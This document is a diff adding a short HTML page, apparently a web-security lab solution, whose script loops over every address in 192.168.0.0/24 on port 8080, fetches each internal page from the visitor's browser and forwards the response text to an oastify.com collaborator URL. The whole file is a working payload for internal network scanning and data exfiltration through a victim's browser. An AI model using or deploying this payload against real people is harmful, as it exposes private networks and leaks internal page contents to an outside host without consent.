@@ -1,0 +1,18 @@
+<html>
+    <script>
+        collaboratorURL = 'https://8t2d07c0ztmhqce38ab6p3lk7bd21r.oastify.com'
+
+        for (let i=0; i<256; i++){
+            fetch('http://192.168.0.' + i + ':8080')
+            .then(response => response.text())
+            .then (text => {
+                try {
+
+                fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + "&code=" + encodeURIComponent(text))
+                } catch(err){
+
+                }
+            })
+        }
+    </script>
+</html>
